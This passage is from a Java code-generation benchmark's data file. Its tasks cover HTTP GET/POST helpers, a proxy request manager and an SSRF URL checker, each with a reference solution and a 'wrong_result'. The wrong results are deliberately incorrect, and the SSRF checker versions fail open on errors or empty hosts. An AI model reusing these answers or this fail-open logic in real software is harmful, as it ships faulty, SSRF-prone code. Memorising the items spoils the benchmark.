    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpURLConnectionUtils {\n\n    private static final String TAG = HttpURLConnectionUtils.class.getSimpleName();\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n    public static final String BAIDU_URL = \"https://www.baidu.com\";\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public interface TimeCallback {\n        void onResponse(long millis);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(final String urlStr, final Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"GET\", urlStr, null, null, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void doPostAsync(final String urlStr, final String params, final Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"POST\", urlStr, null, params, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void getNetTime(final TimeCallback callback) {\n        getNetTime(BAIDU_URL, callback);\n    }\n\n    public static void getNetTime(final String urlStr, final TimeCallback callback) {\n        new Thread(() -> reqNetTime(urlStr, callback)).start();\n    }\n\n    private static void request(\n            final String method,\n            final String urlStr,\n            final Map<String, String> headers,\n            final String params,\n            final Callback callback\n    ) {\n        HttpURLConnection connection = null;\n        InputStream is = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            \n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    connection.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n            \n            if (params != null && params.length() != 0) {\n                connection.setDoInput(true);\n                connection.setDoOutput(true);\n                connection.setUseCaches(false);\n                OutputStream os = connection.getOutputStream();\n                os.write(params.getBytes());\n                os.flush();\n                os.close();\n            }\n            \n            connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n            connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n            \n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                is = connection.getInputStream();\n                baos = new ByteArrayOutputStream();\n                byte[] buffer = new byte[1024];\n                int len;\n                while (((len = is.read(buffer)) != -1)) {\n                    baos.write(buffer, 0, len);\n                }\n                String result = baos.toString();\n                if (callback != null) {\n                    callback.onResponse(result, connection.getDate());\n                }\n            } else {\n                if (callback != null) {\n                    callback.onFail(new Exception(\"responseCode not >= 200 or < 300, code: \" + responseCode));\n                }\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            try {\n                if (baos != null) baos.close();\n                if (is != null) is.close();\n            } catch (Exception ignore) {}\n            \n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n\n    private static void reqNetTime(final String urlStr, final TimeCallback callback) {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            long date = connection.getDate();\n            if (date <= 0) {\n                date = -1L;\n            }\n            if (callback != null) {\n                callback.onResponse(date);\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic class HttpURLConnectionUtils {\n    private static final String TAG = \"HttpURLConnectionUtils\";\n    private static final int TIMEOUT_IN_MILLIS = 5000;\n    private static final String BAIDU_URL = \"https://www.baidu.com\";\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public interface TimeCallback {\n        void onResponse(long millis);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(String urlStr, Callback callback) {\n        request(\"GET\", urlStr, null, null, callback);\n    }\n\n    public static void doPostAsync(String urlStr, String params, Callback callback) {\n        request(\"POST\", urlStr, null, params, callback);\n    }\n\n    public static void getNetTime(TimeCallback callback) {\n        reqNetTime(BAIDU_URL, callback);\n    }\n\n    public static void getNetTime(String urlStr, TimeCallback callback) {\n        reqNetTime(urlStr, callback);\n    }\n\n    private static void request(String method, String urlStr, Map<String, String> headers, String params, Callback callback) {\n        new Thread(() -> {\n            try {\n                URL url = new URL(urlStr);\n                HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                connection.setRequestMethod(method);\n                connection.setConnectTimeout(TIMEOUT_IN_MILLIS);\n                connection.setReadTimeout(TIMEOUT_IN_MILLIS);\n                connection.setDoInput(true);\n                if (headers != null) {\n                    for (Map.Entry<String, String> entry : headers.entrySet()) {\n                        connection.setRequestProperty(entry.getKey(), entry.getValue());\n                    }\n                }\n                if (\"POST\".equals(method) && params != null) {\n                    connection.setDoOutput(true);\n                    try (OutputStream os = connection.getOutputStream()) {\n                        os.write(params.getBytes());\n                    }\n                }\n                int responseCode = connection.getResponseCode();\n                StringBuilder response = new StringBuilder();\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        response.append(line);\n                    }\n                }\n                callback.onResponse(response.toString(), responseCode);\n            } catch (IOException e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n\n    private static void reqNetTime(String urlStr, TimeCallback callback) {\n        new Thread(() -> {\n            try {\n                URL url = new URL(urlStr);\n                HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                connection.setRequestMethod(\"GET\");\n                connection.setConnectTimeout(TIMEOUT_IN_MILLIS);\n                connection.setReadTimeout(TIMEOUT_IN_MILLIS);\n                connection.setDoInput(true);\n                int responseCode = connection.getResponseCode();\n                long millis = System.currentTimeMillis();\n                callback.onResponse(millis);\n            } catch (IOException e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n}\n```"
  },
  {
    "Task_id": 91,
    "Instruction": "Task Description: Implement a Java class for SSRF (Server-Side Request Forgery) security checks that validates URLs to prevent internal network access.\n\nClass Description: The SSRFChecker class provides functionality to check if a given URL is safe by verifying it doesn't resolve to internal IP addresses. It includes methods for URL validation, host extraction, IP resolution, and internal IP detection.\n\nAttributes:\n- logger: Logger - Used for logging error and info messages\n- decimalIp: String - Stores converted IP address in decimal format\n\nMethods:\n- checkSSRF(String url, int checkTimes) -> boolean - Main method to validate URL against SSRF risks. Follows redirects up to checkTimes. Returns true if safe, false if dangerous.\n- isInternalIpByUrl(String url) -> boolean - Checks if URL's host resolves to an internal IP. Returns true if internal/dangerous.\n- isInternalIp(String strIP) -> boolean - Verifies if given IP is in blocked subnets. Returns true if IP is internal.\n- host2ip(String host) -> String - Resolves hostname to IP address. Returns empty string on failure.\n- url2host(String url) -> String - Extracts host from URL. Returns empty string for non-HTTP URLs or invalid URLs.\n- isOctalIP(String host) -> boolean - (Private) Checks if host is in octal IP format. Returns true if octal format detected.",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.InetAddress;\nimport java.net.URI;\nimport java.net.URL;\nimport java.util.ArrayList;\n\nimport org.apache.commons.lang.StringUtils;\nimport org.apache.commons.net.util.SubnetUtils;\nimport org.joychou.config.WebConfig;\nimport org.joychou.security.SecurityUtil;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class SSRFChecker {\n\n    private static final Logger logger = LoggerFactory.getLogger(SSRFChecker.class);\n    private static String decimalIp;\n\n    public static boolean checkSSRF(String url, int checkTimes) {\n        HttpURLConnection connection;\n        int connectTime = 5 * 1000;\n        int i = 1;\n        String finalUrl = url;\n        try {\n            do {\n                if (isInternalIpByUrl(finalUrl)) {\n                    logger.error(\"[-] SSRF check failed. Dangerous url: \" + finalUrl);\n                    return false;\n                }\n\n                connection = (HttpURLConnection) new URL(finalUrl).openConnection();\n                connection.setInstanceFollowRedirects(false);\n                connection.setUseCaches(false);\n                connection.setConnectTimeout(connectTime);\n                connection.connect();\n                int responseCode = connection.getResponseCode();\n                if (responseCode >= 300 && responseCode <= 307 && responseCode != 304 && responseCode != 306) {\n                    String redirectedUrl = connection.getHeaderField(\"Location\");\n                    if (null == redirectedUrl)\n                        break;\n                    finalUrl = redirectedUrl;\n                    i += 1;\n                    logger.info(\"redirected url: \" + finalUrl);\n                    if (i == checkTimes) {\n                        return false;\n                    }\n                } else\n                    break;\n            } while (connection.getResponseCode() != HttpURLConnection.HTTP_OK);\n            connection.disconnect();\n        } catch (Exception e) {\n            return true;\n        }\n        return true;\n    }\n\n    public static boolean isInternalIpByUrl(String url) {\n        String host = url2host(url);\n        if (host.equals(\"\")) {\n            return true;\n        }\n\n        String ip = host2ip(host);\n        if (ip.equals(\"\")) {\n            return true;\n        }\n\n        return isInternalIp(ip);\n    }\n\n    public static boolean isInternalIp(String strIP) {\n        if (StringUtils.isEmpty(strIP)) {\n            logger.error(\"[-] SSRF check failed. IP is empty. \" + strIP);\n            return true;\n        }\n\n        ArrayList<String> blackSubnets = WebConfig.getSsrfBlockIps();\n        for (String subnet : blackSubnets) {\n            SubnetUtils utils = new SubnetUtils(subnet);\n            if (utils.getInfo().isInRange(strIP)) {\n                logger.error(\"[-] SSRF check failed. Internal IP: \" + strIP);\n                return true;\n            }\n        }\n\n        return false;\n    }\n\n    public static String host2ip(String host) {\n        if (null == host) {\n            return \"\";\n        }\n\n        if(isOctalIP(host)) {\n            host = decimalIp;\n        }\n\n        try {\n            InetAddress IpAddress = InetAddress.getByName(host);\n            return IpAddress.getHostAddress();\n        } catch (Exception e) {\n            logger.error(\"host2ip exception \" + e.getMessage());\n            return \"\";\n        }\n    }\n\n    private static String url2host(String url) {\n        try {\n            URI u = new URI(url);\n            if (SecurityUtil.isHttp(url)) {\n                return u.getHost();\n            }\n            return \"\";\n        } catch (Exception e) {\n            return \"\";\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class SSRFChecker {\n    private final Logger logger;\n    private String decimalIp;\n\n    public SSRFChecker(Logger logger) {\n        this.logger = logger;\n    }\n\n    public boolean checkSSRF(String url, int checkTimes) {\n        if (url == null || url.isEmpty()) {\n            logger.info(\"URL is empty or null\");\n            return false;\n        }\n\n        String currentUrl = url;\n        for (int i = 0; i < checkTimes; i++) {\n            String host = url2host(currentUrl);\n            if (host.isEmpty()) {\n                logger.info(\"Invalid URL: \" + currentUrl);\n                return false;\n            }\n\n            if (isInternalIpByUrl(currentUrl)) {\n                logger.info(\"Detected internal IP in URL: \" + currentUrl);\n                return false;\n            }\n\n            String redirectedUrl = followRedirect(currentUrl);\n            if (redirectedUrl == null || redirectedUrl.equals(currentUrl)) {\n                break;\n            }\n            currentUrl = redirectedUrl;\n        }\n\n        return true;\n    }\n\n    private String followRedirect(String url) {\n        try {\n            HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"HEAD\");\n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 300 && responseCode < 400) {\n                String location = connection.getHeaderField(\"Location\");\n                if (location != null && !location.isEmpty()) {\n                    return location;\n                }\n            }\n        } catch (Exception e) {\n            logger.warning(\"Error following redirect for URL: \" + url, e);\n        }\n        return null;\n    }\n\n    public boolean isInternalIpByUrl(String url) {\n        String host = url2host(url);\n        if (host.isEmpty()) {\n            return false;\n        }\n\n        String ip = host2ip(host);\n        if (ip.isEmpty()) {\n            return false;\n        }\n\n        return isInternalIp(ip);\n    }\n\n    public boolean isInternalIp(String strIP) {\n        if (strIP == null || strIP.isEmpty()) {\n            return false;\n        }\n\n        try {\n            InetAddress address = InetAddress.getByName(strIP);\n            if (address.isLoopbackAddress() || address.isSiteLocalAddress() || address.isLinkLocalAddress() || address.isMulticastAddress()) {\n                return true;\n            }\n        } catch (UnknownHostException e) {\n            logger.warning(\"Failed to resolve IP: \" + strIP, e);\n        }\n\n        return false;\n    }\n\n    public String host2ip(String host) {\n        if (host == null || host.isEmpty()) {\n            return \"\";\n        }\n\n        if (isOctalIP(host)) {\n            return convertOctalToDecimal(host);\n        }\n\n        try {\n            InetAddress address = InetAddress.getByName(host);\n            return address.getHostAddress();\n        } catch (UnknownHostException e) {\n            logger.warning(\"Failed to resolve host: \" + host, e);\n            return \"\";\n        }\n    }\n\n    public String url2host(String url) {\n        if (url == null || url.isEmpty()) {\n            return \"\";\n        }\n\n        try {\n            URL parsedUrl = new URL(url);\n            if (!parsedUrl.getProtocol().equalsIgnoreCase(\"http\") && !parsedUrl.getProtocol().equalsIgnoreCase(\"https\")) {\n                return \"\";\n            }\n            return parsedUrl.getHost();\n        } catch (MalformedURLException e) {\n            logger.warning(\"Invalid URL format: \" + url, e);\n            return \"\";\n        }\n    }\n\n    private boolean isOctalIP(String host) {\n        String[] parts = host.split(\"\\\\.\");\n        if (parts.length != 4) {\n            return false;\n        }\n\n        for (String part : parts) {\n            if (part.length() > 1 && part.charAt(0) == '0') {\n                try {\n                    Integer.parseInt(part, 8);\n                    return true;\n                } catch (NumberFormatException e) {\n                    return false;\n                }\n            }\n        }\n\n        return false;\n    }\n\n    private String convertOctalToDecimal(String octalIP) {\n        String[] parts = octalIP.split(\"\\\\.\");\n        StringBuilder decimalIP = new StringBuilder();\n\n        for (int i = 0; i < parts.length; i++) {\n            int value = Integer.parseInt(parts[i], 8);\n            decimalIP.append(value);\n            if (i < parts.length - 1) {\n                decimalIP.append(\".\");\n            }\n        }\n\n        return decimalIP.toString();\n    }\n}"
  },
  {
    "Task_id": 92,
    "Instruction": "Task Description: Create a function that performs an HTTP GET request to a specified URL and returns the response as a string.\n\nFunction Description: The function should establish an HTTP connection to the provided URL, send a GET request, read the response stream, and return the content as a UTF-8 encoded string. It should handle resource cleanup properly by closing all streams and disconnecting the HTTP connection.\n\nInput: \n- requestUrl: String - The URL to which the HTTP GET request will be sent\n\nOutput: \n- String - The response content from the HTTP GET request, or null if an error occurs",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate static String httpRequest(String requestUrl) {\n    StringBuffer buffer = null;\n    BufferedReader bufferedReader = null;\n    InputStreamReader inputStreamReader = null;\n    InputStream inputStream = null;\n    HttpURLConnection httpUrlConn = null;\n    try {\n        // \u5efa\u7acbget\u8bf7\u6c42\n        URL url = new URL(requestUrl);\n        httpUrlConn = (HttpURLConnection) url.openConnection();\n        httpUrlConn.setDoInput(true);\n        httpUrlConn.setRequestMethod(\"GET\");\n        // \u83b7\u53d6\u8f93\u5165\u6d41\n        inputStream = httpUrlConn.getInputStream();\n        inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        bufferedReader = new BufferedReader(inputStreamReader);\n        // \u4ece\u8f93\u5165\u6d41\u83b7\u53d6\u7ed3\u679c\n        buffer = new StringBuffer();\n        String str = null;\n        while ((str = bufferedReader.readLine()) != null) {\n            str = new String(str.getBytes(), \"UTF-8\");\n            buffer.append(str);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        if (bufferedReader != null) {\n            try {\n                bufferedReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStreamReader != null) {\n            try {\n                inputStreamReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (httpUrlConn != null) {\n            httpUrlConn.disconnect();\n        }\n    }\n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpGetRequest {\n    public static String sendGetRequest(String requestUrl) {\n        try {\n            URL url = new URL(requestUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = in.readLine()) != null) {\n                    response.append(line);\n                }\n                in.close();\n                return response.toString();\n            } else {\n                return null;\n            }\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 93,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests with support for proxy configuration, including making GET requests, processing responses, and handling callbacks for success and failure scenarios.\n\nClass Description: The HttpRequestManager class manages HTTP requests with configurable proxy settings. It provides functionality to make GET requests to a specified URL, process the response (including Base64 decoding), and notify the caller of success or failure through a callback interface.\n\nAttributes:\n- mProxyOn: boolean - Indicates whether proxy is enabled\n- mProxyHost: String - The host address of the proxy server\n- mProxyPort: long - The port number of the proxy server\n\nMethods:\n- HttpRequestManager(boolean proxyOn, String proxyHost, long proxyPort) -> void - Constructor that initializes proxy configuration\n- requestSubscribeServerConfigs(String urlStr, Callback callback) -> void - Makes a GET request to the specified URL and processes the response, notifying through callback\n- readStringFromStream(InputStream inputStream) -> String - Helper method to read and convert an InputStream to a String\n- interface Callback - Nested interface for handling request results\n  - onSuccess(String response) -> void - Called when request succeeds\n  - onFailed() -> void - Called when request fails",
    "Canonical_solution": "import android.net.Uri;\nimport android.text.TextUtils;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.MalformedURLException;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Objects;\n\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class HttpRequestManager {\n    private boolean mProxyOn;\n    private String mProxyHost;\n    private long mProxyPort;\n\n    public HttpRequestManager(boolean proxyOn, String proxyHost, long proxyPort) {\n        mProxyOn = proxyOn;\n        mProxyHost = proxyHost;\n        mProxyPort = proxyPort;\n    }\n\n    public void requestSubscribeServerConfigs(String urlStr, @NonNull Callback callback) {\n        URL url;\n        try {\n            url = new URL(urlStr);\n        } catch (MalformedURLException e) {\n            e.printStackTrace();\n            callback.onFailed();\n            return;\n        }\n        HttpURLConnection connection = null;\n        try {\n            if (mProxyOn) {\n                InetSocketAddress proxyAddress = new InetSocketAddress(mProxyHost, (int) mProxyPort);\n                Proxy proxy = new Proxy(Proxy.Type.SOCKS, proxyAddress);\n                connection = (HttpURLConnection) url.openConnection(proxy);\n            } else {\n                connection = (HttpURLConnection) url.openConnection();\n            }\n            connection.setReadTimeout(10000);\n            connection.setConnectTimeout(10000);\n            connection.setRequestMethod(\"GET\");\n            connection.setDoInput(true);\n            connection.connect();\n            int responseCode = connection.getResponseCode();\n            if (responseCode != HttpsURLConnection.HTTP_OK) {\n                callback.onFailed();\n                return;\n            }\n            try (InputStream stream = connection.getInputStream()) {\n                if (stream != null) {\n                    @Nullable String response = DecodeUtils.decodeBase64(readStringFromStream(stream));\n                    if (TextUtils.isEmpty(response)) {\n                        callback.onFailed();\n                    } else {\n                        callback.onSuccess(response);\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            callback.onFailed();\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    private String readStringFromStream(InputStream inputStream) {\n        try (Reader reader = new InputStreamReader(inputStream, StandardCharsets.UTF_8)) {\n            char[] buf = new char[4096];\n            StringBuilder sb = new StringBuilder();\n            int readSize;\n            while ((readSize = reader.read(buf)) != -1) {\n                sb.append(buf, 0, readSize);\n            }\n            return sb.toString();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public interface Callback {\n        void onSuccess(String response);\n        void onFailed();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpRequestManager {\n    private boolean mProxyOn;\n    private String mProxyHost;\n    private long mProxyPort;\n\n    public HttpRequestManager(boolean proxyOn, String proxyHost, long proxyPort) {\n        mProxyOn = proxyOn;\n        mProxyHost = proxyHost;\n        mProxyPort = proxyPort;\n    }\n\n    public void requestSubscribeServerConfigs(String urlStr, Callback callback) {\n        try {\n            java.net.URL url = new java.net.URL(urlStr);\n            java.net.Proxy proxy = null;\n            if (mProxyOn) {\n                proxy = new java.net.Proxy(java.net.Proxy.Type.HTTP, new java.net.InetSocketAddress(mProxyHost, (int) mProxyPort));\n            }\n            java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection(proxy);\n            connection.setRequestMethod(\"GET\");\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                String response = readStringFromStream(connection.getInputStream());\n                callback.onSuccess(response);\n            } else {\n                callback.onFailed();\n            }\n        } catch (Exception e) {\n            callback.onFailed();\n        }\n    }\n\n    private String readStringFromStream(java.io.InputStream inputStream) throws java.io.IOException {\n        java.util.Scanner scanner = new java.util.Scanner(inputStream).useDelimiter(\"\\\\A\");\n        return scanner.hasNext() ? scanner.next() : \"\";\n    }\n\n    public interface Callback {\n        void onSuccess(String response);\n        void onFailed();\n    }\n}"
  },
  {
    "Task_id": 94,
    "Instruction": "Task Description: Implement a lightweight HTTP client class in Java that can perform GET and POST requests with configurable headers, parameters, and timeouts.\n\nClass Description: HttpTinyClient is a utility class that provides basic HTTP GET and POST functionality using Java's HttpURLConnection. It handles URL parameter encoding, header management, and response processing.\n\nAttributes:\nNone (This is a utility class with only static methods)\n\nMethods:\n\nMethod1: httpGet(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) -> HttpResult - Performs an HTTP GET request to the specified URL with given headers and parameters. Encodes parameters in the URL query string.\n\nMethod2: httpPost(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) -> HttpResult - Performs an HTTP POST request to the specified URL with given headers and parameters. Encodes parameters in the request body.\n\nMethod3: encodingParams(List<String> paramValues, String encoding) -> String - Helper method that encodes parameter values for URL or POST body using the specified character encoding.\n\nMethod4: setHeaders(HttpURLConnection conn, List<String> headers, String encoding) -> void - Helper method that sets request headers including default headers for content type and client version.\n\nNested Class: HttpResult - Represents the result of an HTTP request with status code and response content.\n\nAttributes:\ncode: int - HTTP response status code\ncontent: String - Response body content",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.util.Iterator;\nimport java.util.List;\nimport org.apache.rocketmq.common.MQVersion;\nimport org.apache.rocketmq.common.MixAll;\n\npublic class HttpTinyClient {\n\n    static public HttpResult httpGet(String url, List<String> headers, List<String> paramValues,\n        String encoding, long readTimeoutMs) throws IOException {\n        String encodedContent = encodingParams(paramValues, encoding);\n        url += (null == encodedContent) ? \"\" : (\"?\" + encodedContent);\n\n        HttpURLConnection conn = null;\n        try {\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"GET\");\n            conn.setConnectTimeout((int) readTimeoutMs);\n            conn.setReadTimeout((int) readTimeoutMs);\n            setHeaders(conn, headers, encoding);\n\n            conn.connect();\n            int respCode = conn.getResponseCode();\n            String resp = null;\n\n            if (HttpURLConnection.HTTP_OK == respCode) {\n                resp = IOTinyUtils.toString(conn.getInputStream(), encoding);\n            } else {\n                resp = IOTinyUtils.toString(conn.getErrorStream(), encoding);\n            }\n            return new HttpResult(respCode, resp);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n    }\n\n    static private String encodingParams(List<String> paramValues, String encoding)\n        throws UnsupportedEncodingException {\n        StringBuilder sb = new StringBuilder();\n        if (null == paramValues) {\n            return null;\n        }\n\n        for (Iterator<String> iter = paramValues.iterator(); iter.hasNext(); ) {\n            sb.append(iter.next()).append(\"=\");\n            sb.append(URLEncoder.encode(iter.next(), encoding));\n            if (iter.hasNext()) {\n                sb.append(\"&\");\n            }\n        }\n        return sb.toString();\n    }\n\n    static private void setHeaders(HttpURLConnection conn, List<String> headers, String encoding) {\n        if (null != headers) {\n            for (Iterator<String> iter = headers.iterator(); iter.hasNext(); ) {\n                conn.addRequestProperty(iter.next(), iter.next());\n            }\n        }\n        conn.addRequestProperty(\"Client-Version\", MQVersion.getVersionDesc(MQVersion.CURRENT_VERSION));\n        conn.addRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded;charset=\" + encoding);\n\n        String ts = String.valueOf(System.currentTimeMillis());\n        conn.addRequestProperty(\"Metaq-Client-RequestTS\", ts);\n    }\n\n    static public HttpResult httpPost(String url, List<String> headers, List<String> paramValues,\n        String encoding, long readTimeoutMs) throws IOException {\n        String encodedContent = encodingParams(paramValues, encoding);\n\n        HttpURLConnection conn = null;\n        try {\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setConnectTimeout(3000);\n            conn.setReadTimeout((int) readTimeoutMs);\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            setHeaders(conn, headers, encoding);\n\n            conn.getOutputStream().write(encodedContent.getBytes(MixAll.DEFAULT_CHARSET));\n\n            int respCode = conn.getResponseCode();\n            String resp = null;\n\n            if (HttpURLConnection.HTTP_OK == respCode) {\n                resp = IOTinyUtils.toString(conn.getInputStream(), encoding);\n            } else {\n                resp = IOTinyUtils.toString(conn.getErrorStream(), encoding);\n            }\n            return new HttpResult(respCode, resp);\n        } finally {\n            if (null != conn) {\n                conn.disconnect();\n            }\n        }\n    }\n\n    static public class HttpResult {\n        final public int code;\n        final public String content;\n\n        public HttpResult(int code, String content) {\n            this.code = code;\n            this.content = content;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpTinyClient {\n    public static class HttpResult {\n        public int code;\n        public String content;\n    }\n\n    public static HttpResult httpGet(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) {\n        try {\n            String encodedParams = encodingParams(paramValues, encoding);\n            String fullUrl = url + (encodedParams.isEmpty() ? \"\" : \"?\" + encodedParams);\n            HttpURLConnection conn = (HttpURLConnection) new URL(fullUrl).openConnection();\n            conn.setRequestMethod(\"GET\");\n            conn.setConnectTimeout(5000);\n            conn.setReadTimeout((int) readTimeoutMs);\n            setHeaders(conn, headers, encoding);\n            int responseCode = conn.getResponseCode();\n            StringBuilder response = new StringBuilder();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n            HttpResult result = new HttpResult();\n            result.code = responseCode;\n            result.content = response.toString();\n            return result;\n        } catch (Exception e) {\n            HttpResult result = new HttpResult();\n            result.code = -1;\n            result.content = e.getMessage();\n            return result;\n        }\n    }\n\n    public static HttpResult httpPost(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) {\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setConnectTimeout(5000);\n            conn.setReadTimeout((int) readTimeoutMs);\n            conn.setDoOutput(true);\n            setHeaders(conn, headers, encoding);\n            String encodedParams = encodingParams(paramValues, encoding);\n            try (OutputStream os = conn.getOutputStream()) {\n                byte[] input = encodedParams.getBytes(encoding);\n                os.write(input, 0, input.length);\n            }\n            int responseCode = conn.getResponseCode();\n            StringBuilder response = new StringBuilder();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n            HttpResult result = new HttpResult();\n            result.code = responseCode;\n            result.content = response.toString();\n            return result;\n        } catch (Exception e) {\n            HttpResult result = new HttpResult();\n            result.code = -1;\n            result.content = e.getMessage();\n            return result;\n        }\n    }\n\n    private static String encodingParams(List<String> paramValues, String encoding) {\n        if (paramValues == null || paramValues.isEmpty()) {\n            return \"\";\n        }\n        StringBuilder encodedParams = new StringBuilder();\n        for (int i = 0; i < paramValues.size(); i += 2) {\n            String key = paramValues.get(i);\n            String value = (i + 1 < paramValues.size()) ? paramValues.get(i + 1) : \"\";\n            try {\n                encodedParams.append(URLEncoder.encode(key, encoding)).append(\"=\").append(URLEncoder.encode(value, encoding));\n                if (i + 2 < paramValues.size()) {\n                    encodedParams.append(\"&\");\n                }\n            } catch (UnsupportedEncodingException e) {\n                return \"\";\n            }\n        }\n        return encodedParams.toString();\n    }\n\n    private static void setHeaders(HttpURLConnection conn, List<String> headers, String encoding) {\n        if (headers != null) {\n            for (int i = 0; i < headers.size(); i += 2) {\n                String name = headers.get(i);\n                String value = (i + 1 < headers.size()) ? headers.get(i + 1) : \"\";\n                conn.setRequestProperty(name, value);\n            }\n        }\n        conn.setRequestProperty(\"User-Agent\", \"HttpTinyClient/1.0\");\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded; charset=\" + encoding);\n    }\n}"
  },
  {
    "Task_id": 95,
